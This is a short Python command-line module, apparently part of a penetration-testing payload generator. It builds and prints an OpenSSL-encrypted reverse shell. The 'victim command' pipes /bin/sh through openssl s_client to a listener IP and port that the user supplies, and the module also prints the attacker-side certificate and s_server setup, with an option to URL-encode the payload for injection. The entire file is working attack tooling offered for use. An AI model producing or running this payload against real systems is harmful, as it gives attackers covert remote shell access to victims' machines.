import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Print victim command only.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the victim command.")
def command(listener_ip, listener_port, raw, urlencode):
    """Return OpenSSL encrypted reverse shell"""
    victim_cmd = (f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "
                  f"openssl s_client -quiet -connect {listener_ip}:{listener_port} > /tmp/s; rm /tmp/s")
    attacker_setup = (f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\t"
                      f"openssl s_server -quiet -key key.pem -cert cert.pem -port {listener_port}")
    if urlencode:
        victim_cmd = quote(victim_cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}OpenSSL attacker setup:\n\t{Fore.WHITE}{attacker_setup}")
        click.secho(f"{Fore.LIGHTGREEN_EX}OpenSSL victim command:\n\t{Fore.WHITE}{victim_cmd}")
    else:
        click.secho(victim_cmd, nl=False)
